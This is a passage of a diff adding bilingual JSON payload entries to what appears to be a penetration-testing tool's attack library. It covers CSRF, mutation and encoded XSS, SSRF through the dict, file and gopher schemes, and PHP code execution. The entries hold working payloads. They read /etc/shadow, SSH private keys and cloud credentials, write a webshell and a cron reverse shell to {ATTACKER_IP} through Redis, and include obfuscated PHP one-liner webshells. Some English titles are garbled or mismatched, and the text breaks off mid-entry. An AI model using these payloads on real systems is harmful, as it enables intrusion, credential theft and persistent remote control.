+      "zh": "以 text/plain 的 Fetch 发送 JSON 语义请求体；服务端把它当作 JSON 解析并接受状态变更，即确认简单请求绕过内容类型限制。",
+      "en": "Send a JSON-semantic body as text/plain via fetch; if the server parses it as JSON and accepts the state change, the simple-request content-type bypass is confirmed."
+     },
+     "title": {
+      "zh": "JSON CSRF",
+      "en": "JSON CSRF"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<a href=\"http://127.0.0.1:18080/lab/csrf/navigation?marker=CSRF_NAV_D4\">CSRF_NAV_D4</a>",
+     "description": {
+      "zh": "诱导点击链接触发顶级导航 GET；目标端点在导航中携带会话并改变合成状态，即确认链接型 CSRF。",
+      "en": "Lure a click on the link to trigger a top-level navigation GET; if the endpoint receives ambient credentials during navigation and the synthetic state changes, link-based CSRF is confirmed."
+     },
+     "title": {
+      "zh": "链接诱导",
+      "en": "Link enticement"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<!doctype html>\n<meta name=\"referrer\" content=\"no-referrer\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/referer-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_NOREF_E5\">\n  <button type=\"submit\">Submit no-referrer control</button>\n</form>",
+     "description": {
+      "zh": "以 no-referrer 提交对照表单；缺失 Referer 的请求仍被接受且状态变化，即确认 Referer 校验可被空 Referer 绕过。",
+      "en": "Submit the control form with no-referrer; if the Referer-less request is still accepted and state changes, Referer validation is bypassable via empty Referer."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<!doctype html>\n<form action=\"http://127.0.0.1:18080/lab/csrf/token-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_TOKEN_F6\">\n  <button type=\"submit\">Submit missing-token control</button>\n</form>",
+     "description": {
+      "zh": "提交缺失 CSRF Token 的对照表单；无 Token 请求仍被接受且状态变化，即确认 Token 校验未强制。",
+      "en": "Submit the control form without a CSRF token; if the token-less request is accepted and state changes, token validation is not enforced."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "<img src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <img src=\"https://{TARGET}/delete?user=1\"> \n <img src=\"https://{TARGET}/admin/promote?user=attacker\"> \n <script src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"></script> \n <link href=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\" rel=\"stylesheet\"> \n <object data=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <embed src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <video poster=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <audio src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <video src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"><source src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"></video> \n <video controls><track src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\" kind=\"captions\"></video> \n <iframe src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <body background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <table background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <td background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <div style=\"background:url(https://{TARGET}/api/transfer?to=attacker&amount=1000)\"> \n <input type=\"image\" src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\">",
+     "command": "<img src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <img src=\"https://{TARGET}/delete?user=1\"> \n <img src=\"https://{TARGET}/admin/promote?user=attacker\"> \n <script src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"></script> \n <link href=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\" rel=\"stylesheet\"> \n <object data=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <embed src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <video poster=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <audio src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <video src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"><source src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"></video> \n <video controls><track src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\" kind=\"captions\"></video> \n <iframe src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <body background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <table background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <td background=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\"> \n <div style=\"background:url(https://{TARGET}/api/transfer?to=attacker&amount=1000)\"> \n <input type=\"image\" src=\"https://{TARGET}/api/transfer?to=attacker&amount=1000\">"
+    }
+   ]
+  },
+  {
+   "id": "xss-mxss",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+     "description": {
+      "zh": "利用 noscript 解析差异构造属性逃逸；渲染后 img 载荷执行即确认 mXSS 成立。",
+      "en": "Exploit noscript parsing differences for attribute breakout; the img payload executing after rendering confirms mXSS."
+     },
+     "title": {
+      "zh": "基础mXSS探测",
+      "en": "Basicm XSS Detect"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>\n<svg><script><![CDATA[alert(1)]]></script></svg>",
+     "description": {
+      "zh": "以 SVG CDATA 突变提交；解析突变后脚本执行即确认 SVG 命名空间 mXSS。",
+      "en": "Submit SVG CDATA mutations; script execution after parser mutation confirms SVG-namespace mXSS."
+     },
+     "title": {
+      "zh": "SVG m XSS",
+      "en": "SVG m XSS"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+     "description": {
+      "zh": "以 MathML mglyph/style 突变提交；突变后 img 执行即确认 MathML mXSS。",
+      "en": "Submit MathML mglyph/style mutations; img execution after mutation confirms MathML mXSS."
+     },
+     "title": {
+      "zh": "Math m XSS",
+      "en": "Math m XSS"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<form id=x></form><form id=x><img src=x onerror=alert(1)></form>",
+     "description": {
+      "zh": "以重复 id 表单触发 DOM clobbering 配合载荷；覆盖生效并执行即确认 clobbering 可助攻触发。",
+      "en": "Trigger DOM clobbering with duplicate-id forms alongside the payload; the override taking effect and firing confirms clobbering assists execution."
+     },
+     "title": {
+      "zh": "DOM clobbering配合",
+      "en": "DOM clobbering combination"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<svg><script>&#97;lert(1)</script></svg>\n<svg><script>a&#108;ert(1)</script></svg>",
+     "description": {
+      "zh": "以 SVG 内实体编码脚本提交；解码后执行即确认 SVG 脚本编码绕过有效。",
+      "en": "Submit entity-encoded scripts inside SVG; execution after decoding confirms the SVG script-encoding bypass."
+     }
+    }
+   ]
+  },
+  {
+   "id": "xss-encoding",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<img src=x onerror=%61lert(1)>\n%3Cscript%3Ealert(1)%3C/script%3E",
+     "description": {
+      "zh": "URL 编码标签提交；解码后执行即确认单层解码差异可利用。",
+      "en": "Submit URL-encoded tags; execution after decoding confirms exploitable single-pass decoding."
+     },
+     "title": {
+      "zh": "URL编码",
+      "en": "URL Encoding"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n&lt;script&gt;alert(1)&lt;/script&gt;",
+     "description": {
+      "zh": "HTML 实体编码提交；解码后执行即确认实体解码差异可利用。",
+      "en": "Submit HTML-entity encoded payloads; execution after decoding confirms exploitable entity decoding."
+     },
+     "title": {
+      "zh": "HTML实体编码",
+      "en": "HTML-entity encoding"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<img src=x onerror=\"\\u0061lert(1)\">\n<img src=x onerror=\"\\x61lert(1)\">\n<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
+     "description": {
+      "zh": "以 JS Unicode 转义、\\x 十六进制转义与 atob 编码提交；求值后执行即确认 JS 解码层绕过有效。",
+      "en": "Submit JS hex/octal/atob encodings; execution after evaluation confirms the JS decode-layer bypass."
+     },
+     "title": {
+      "zh": "JavaScript编码",
+      "en": "Java Script Encoding"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<style>body{background:url(\"javascript:alert(1)\")}</style>\n<div style=\"x:expression(alert(1))\">",
+     "description": {
+      "zh": "以 CSS expression（旧版 IE）提交；表达式执行即确认旧引擎下 CSS 编码层可利用。",
+      "en": "Submit CSS expression payloads (legacy IE); expression execution confirms the CSS encode layer is exploitable on legacy engines."
+     },
+     "title": {
+      "zh": "CSS编码",
+      "en": "CSSEncoding"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">\n<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>",
+     "description": {
+      "zh": "混合多层编码提交；逐层解码后执行即确认多层解码链差异可利用。",
+      "en": "Submit multi-layer mixed encodings; execution after layered decoding confirms exploitable multi-decode chains."
+     },
+     "title": {
+      "zh": "混合编码",
+      "en": "Mixed encoding"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E",
+     "description": {
+      "zh": "以 UTF-16 编码标签提交；按 UTF-16 解码后执行即确认编码声明差异可利用。",
+      "en": "Submit UTF-16 encoded tags; execution after UTF-16 decoding confirms exploitable encoding-declaration differences."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "<svg><script>prompt&#x28;1&#x29;</script></svg>",
+     "command": "<svg><script>prompt&#x28;1&#x29;</script></svg>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "<svg><script>alert&lpar;1&rpar;</script></svg>",
+     "command": "<svg><script>alert&lpar;1&rpar;</script></svg>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "<svg><script>alert&#40;1&#41;</script></svg> 与 <svg><script>alert&#x28;1&#x29;</script></svg>",
+     "command": "<svg><script>alert&#40;1&#41;</script></svg> 与 <svg><script>alert&#x28;1&#x29;</script></svg>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 7,
+     "expectedCommand": "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>\n<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)\">click</a>\n<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)\">click</a>\n<a href=\"&#x000006A&#x0000061&#x0000076&#x0000061&#x0000073&#x0000063&#x0000072&#x0000069&#x0000070&#x0000074;:alert(1)\">click</a>\n<a href=\"&#x6a;avascript:alert(1)\">click</a>\n<a href=\"&#x6A;avascript:alert(1)\">click</a>\n<a href=\"&#106;avascript:alert(1)\">click</a>\n<a href=\"&#74;avascript:alert(1)\">click</a>\n<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74;:alert(1)\">click</a>\n<a href=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116;:alert(1)\">click</a>\n<a href=\"&#0106&#097&#118&#97&#115&#99&#114&#105&#112&#116;:alert(1)\">click</a>\n<a href=\"&#00106&#0097&#0118&#0097&#0115&#0099&#0114&#0105&#0112&#0116;:alert(1)\">click</a>\n<a href=\"&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074;:alert(1)\">click</a>\n<a href=\"&#x0006a&#x00061&#x00076&#x00061&#x00073&#x00063&#x00072&#x00069&#x00070&#x00074;:alert(1)\">click</a>\n<a href=\"&#x00006a&#x000061&#x000076&#x000061&#x000073&#x000063&#x000072&#x000069&#x000070&#x000074;:alert(1)\">click</a>",
+     "description": {
+      "zh": "作为无 WAF 场景的对照组：先直连确认这 15 条 HTML 实体编码 href 样例的执行行为并记录判定依据，再叠加 WAF 复测对比拦截与放行差异；本条不提供额外绕过变体。",
+      "en": "Byte-identical to execution[0]; serves as the no-WAF control group: confirm how the 15 samples behave when directly connected, then retest behind the WAF to compare blocking differences. This entry adds no extra bypass variant."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ssrf-dict",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "dict://{TARGET}:{TARGET_PORT}/{COMMAND}",
+     "description": {
+      "zh": "向目标主机与端口发送 dict 探测命令；捕获器收到探测命令行即确认 dict scheme 端口边界。",
+      "en": "Send the dict probe command to the target host and port; the capture service receiving the command line confirms the dict-scheme port boundary."
+     },
+     "title": {
+      "zh": "dict 向指定端口发指令",
+      "en": "SSRF Dict Port-Boundary Validation Cleaned Command 1"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*",
+     "description": {
+      "zh": "对回环 6379 发送 info 与 keys 命令；返回 Redis 信息或键列表即确认 dict 可与 Redis 交互。",
+      "en": "Send info and keys to loopback 6379; a returned Redis info block or key list confirms dict interaction with Redis."
+     },
+     "title": {
+      "zh": "dict 交互 Redis 命令",
+      "en": "SSRF Dict Port-Boundary Validation Cleaned Command 2"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key",
+     "description": {
+      "zh": "对回环 11211 发送 stats 与 get 命令；返回统计文本或键值即确认 Memcached 可经 dict 探测。",
+      "en": "Send stats and get to loopback 11211; returned stats text or key values confirms Memcached probing via dict."
+     },
+     "title": {
+      "zh": "dict 交互 Memcached",
+      "en": "SSRF Dict Port-Boundary Validation Cleaned Command 3"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "dict://127.0.0.1:6379/set%20shell%20\"<?php @eval($_POST[cmd]);?>\"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save",
+     "description": {
+      "zh": "按序执行 set、config、save 序列；Web 根目录出现 shell.php 且可被解析，即确认 dict 可写入 WebShell。",
+      "en": "Execute the set, config, and save sequence in order; shell.php appearing in the web root and parsing confirms WebShell writing via dict."
+     },
+     "title": {
+      "zh": "Redis写入文件",
+      "en": "Redis Write File"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "dict://127.0.0.1:6379/%73%65%74%20p%201",
+     "description": {
+      "zh": "提交百分号编码的命令变体；捕获器解码后收到 set 命令，即确认编码绕过单层过滤。",
+      "en": "Submit the percent-encoded command variant; a decoded set command on the capture service confirms encoding bypasses single-pass filtering."
+     },
+     "command": "dict://127.0.0.1:6379/%73%65%74%20p%201",
+     "title": {
+      "zh": "命令百分号编码绕过",
+      "en": "SSRF Dict Port-Boundary Validation Cleaned Command 1"
+     }
+    }
+   ]
+  },
+  {
+   "id": "ssrf-file",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "file:///etc/passwd\nfile:///etc/shadow\nfile:///etc/hosts\nfile:///etc/resolv.conf\nfile:///proc/self/environ\nfile:///proc/self/cmdline",
+     "description": {
+      "zh": "逐条读取 Linux 敏感文件；返回对应文件内容即确认 file scheme 可读且路径未被过滤。",
+      "en": "Read each sensitive Linux file; returned content confirms the file scheme is readable and paths are unfiltered."
+     },
+     "title": {
+      "zh": "Linux敏感文件",
+      "en": "Linux Sensitive Files"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa\nfile:///c:/inetpub/logs/logfiles/",
+     "description": {
+      "zh": "逐条读取 Windows 敏感文件；返回 win.ini、SAM 或私钥内容即确认 Windows 路径可读。",
+      "en": "Read each sensitive Windows file; returned win.ini, SAM, or key content confirms Windows paths are readable."
+     },
+     "title": {
+      "zh": "Windows敏感文件",
+      "en": "Windows Sensitive Files"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app/config/database.yml\nfile:///app/.env",
+     "description": {
+      "zh": "逐条读取 Web 应用配置；返回数据库连接串或应用密钥即确认配置文件可被窃取。",
+      "en": "Read each web-application configuration file; returned connection strings or application secrets confirm configuration theft."
+     },
+     "title": {
+      "zh": "Web配置文件",
+      "en": "Web Configuration File"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nfile:///home/user/.aws/credentials",
+     "description": {
+      "zh": "逐条读取云环境凭据文件；返回 serviceaccount token 或 AWS credentials 即确认云凭据可被窃取。",
+      "en": "Read each cloud-credential file; a returned serviceaccount token or AWS credentials file confirms cloud-credential theft."
+     },
+     "title": {
+      "zh": "云环境文件",
+      "en": "Cloud environment files"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///root/.ssh/id_rsa",
+     "description": {
+      "zh": "逐条读取 SSH 私钥路径；返回 OPENSSH PRIVATE KEY 内容即确认私钥可被窃取。",
+      "en": "Read each SSH private-key path; returned OPENSSH PRIVATE KEY content confirms private-key theft."
+     },
+     "title": {
+      "zh": "SSH密钥",
+      "en": "SSHkey"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD",
+     "description": {
+      "zh": "以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。",
+      "en": "Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 7,
+     "expectedCommand": "file:///c:/progra~1/ \n file:///c:/progra~1/common~1/",
+     "command": "file:///c:/progra~1/ \n file:///c:/progra~1/common~1/"
+    }
+   ]
+  },
+  {
+   "id": "ssrf-redis",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "gopher://127.0.0.1:6379/_PING%0d%0a",
+     "description": {
+      "zh": "对回环 6379 发送 dict info 与 gopher PING；返回 Redis 信息或 +PONG 即确认 Redis 可达。",
+      "en": "Send dict info and a gopher PING to loopback 6379; returned Redis info or +PONG confirms Redis reachability."
+     },
+     "command": "gopher://127.0.0.1:6379/_PING%0d%0a",
+     "title": {
+      "zh": "gopher PING 探活 Redis",
+      "en": "SSRF Redis PING Reachability Validation Cleaned Command 1"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "dict://127.0.0.1:6379/set%20shell%20\"<?php @eval($_POST[cmd]);?>\"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save",
+     "description": {
+      "zh": "按序执行 set、config、save 序列写入 WebShell；Web 根出现 shell.php 且可解析即确认持久化成功。",
+      "en": "Execute the set, config, and save sequence to write a WebShell; shell.php appearing in the web root and parsing confirms persistence."
+     },
+     "title": {
+      "zh": "dict 序列落盘 WebShell",
+      "en": "SSRF Redis PING Reachability Validation Cleaned Command 2"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A",
+     "description": {
+      "zh": "提交 RESP PING 帧；返回 +PONG 即确认 gopher 到 Redis 的单命令链路。",
+      "en": "Submit the RESP PING frame; a +PONG reply confirms the single-command gopher-to-Redis path."
+     },
+     "title": {
+      "zh": "RESP PING 帧链路验证",
+      "en": "SSRF Redis PING Reachability Validation Cleaned Command 1"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "python redis-rogue-server.py --rhost=127.0.0.1 --lhost={ATTACKER_IP}",
+     "command": "python redis-rogue-server.py --rhost=127.0.0.1 --lhost={ATTACKER_IP}",
+     "description": {
+      "zh": "先经 SSRF 通道（dict/gopher）向目标 Redis 下发 SLAVEOF {ATTACKER_IP} 6379，再运行 rogue server 等待主从同步与模块推送；Redis 日志出现 MODULE LOAD 且同步完成即确认 rogue 加载链路可用，验证后以 SLAVEOF NO ONE 恢复。",
+      "en": "Run the rogue server to load a Redis module; MODULE LOAD in Redis logs with completed replication confirms the rogue-load path."
+     },
+     "title": {
+      "zh": "主从同步加载恶意模块",
+      "en": "SSRF Redis PING Reachability Validation Cleaned Command 5"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0assh%0d%0a$380%0d%0a%0a%0a%0a%0a{PUBLIC_KEY}%0a%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$10%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
+     "command": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0assh%0d%0a$380%0d%0a%0a%0a%0a%0a{PUBLIC_KEY}%0a%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$10%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0acron%0d%0a$70%0d%0a%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1%0a%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
+     "command": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0acron%0d%0a$70%0d%0a%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1%0a%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "gopher://127.0.0.1:6379/_*4%0a$6%0aconfig%0a$3%0aset%0a$3%0adir%0a$4%0a/var%0d%0a \n gopher://127.0.0.1:6379/_*4%0a$6%0aconfig%0a$3%0aset%0a$10%0adbfilename%0a$9%0ashell.php%0d%0a",
+     "command": "gopher://127.0.0.1:6379/_*4%0a$6%0aconfig%0a$3%0aset%0a$3%0adir%0a$4%0a/var%0d%0a \n gopher://127.0.0.1:6379/_*4%0a$6%0aconfig%0a$3%0aset%0a$10%0adbfilename%0a$9%0ashell.php%0d%0a"
+    }
+   ]
+  },
+  {
+   "id": "rce-php",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "eval($_POST[cmd]);\nassert($_POST[cmd]);\npreg_replace('/a/e',$_POST[cmd],'a');\ncreate_function('',$_POST[cmd]);\narray_map($_POST[func],$_POST[arr]);\ncall_user_func($_POST[func],$_POST[arg]);",
+     "description": {
+      "zh": "判据: 列举 eval、assert、preg_replace /e、create_function、array_map、call_user_func 等动态执行形态。命中判据：eval/assert/preg_replace /e 形态传入 PHP 代码（如 cmd=system('id');）后返回 uid=…；create_function 形态需调用其返回的函数；array_map/call_user_func 以回调函数名加参数组合传入后返回执行结果。",
+      "en": "Lists dynamic-execution forms such as eval, assert, preg_replace /e, create_function, array_map, and call_user_func. Success check: passing the paired parameters returns executed output (e.g. cmd=id yields uid=...)."
+     },
+     "title": {
+      "zh": "常见危险函数",
+      "en": "common Dangerous Function"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "system('whoami');\nexec('whoami');\nshell_exec('whoami');\npassthru('whoami');\npopen('whoami','r');\nproc_open('whoami',$desc,$pipes);\n`whoami`;",
+     "description": {
+      "zh": "判据: 列举 system、exec、shell_exec、passthru、popen、proc_open 与反引号的命令执行形态。命中判据：system/passthru 直接输出 whoami 的当前用户名；exec/shell_exec/反引号仅返回字符串，需用 echo 包裹（如 echo `whoami`;）页面才可见用户名。",
+      "en": "Lists command-execution forms of system, exec, shell_exec, passthru, popen, proc_open, and backticks. Success check: the page prints the current username from whoami."
+     },
+     "title": {
+      "zh": "命令执行",
+      "en": "Command Execution"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<?php @eval($_POST[cmd]);?>\n<?php @assert($_POST[cmd]);?>\n<?php @system($_GET[cmd]);?>\n<?php $a=create_function('',$_POST[cmd]);$a();?>",
+     "description": {
+      "zh": "判据: 部署 @eval/@assert/@system 一句话木马后按各自传参方式连接。命中判据：eval/assert 形态 POST cmd=system('id'); 后响应包含 uid=… 输出；system 形态以 GET 传 cmd=id 即返回 uid=…。",
+      "en": "Deploys @eval/@assert/@system one-line webshells and connects through the cmd parameter. Success check: posting cmd=id returns uid=... output."
+     },
+     "title": {
+      "zh": "一句话木马",
+      "en": "One-liner webshell"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<?php $_POST[1]($_POST[cmd]);?>\n<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>\n<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>",
+     "description": {
+      "zh": "用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。",
+      "en": "Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output."
+     },
+     "title": {
+      "zh": "变形一句话",
+      "en": "Variant one-liner webshell"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "array_map('assert',array($_POST[cmd]));\ncall_user_func('assert',$_POST[cmd]);\n$a='assert';$a($_POST[cmd]);",
+     "description": {
+      "zh": "经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。",
+      "en": "Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);",
+     "description": {
+      "zh": "判据: 由 GET 参数 func 与 cmd 决定动态调用。命中判据：func=system&cmd=id 时响应包含 uid=…；如以 assert 作 func，cmd 需传 PHP 代码（如 system('id');）。",
+      "en": "Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response."
+     }
+    }
+   ]
+  },
+  {
+   "id": "rce-php-filter",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp",
+     "description": {
+      "zh": "提交 iconv 与 base64 组合的完整 php://filter 链作为包含参数。命中判据：包含执行后输出经链变换的可控内容（按链解码还原为种子 PHP 代码）。",
+      "en": "Submits a full php://filter chain combining iconv and base64 as the inclusion parameter. Success check: inclusion emits chain-transformed controllable content that decodes back to the seed PHP code."
+     },
+     "title": {
+      "zh": "完整利用示例",
+      "en": "complete Exploitationexample"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
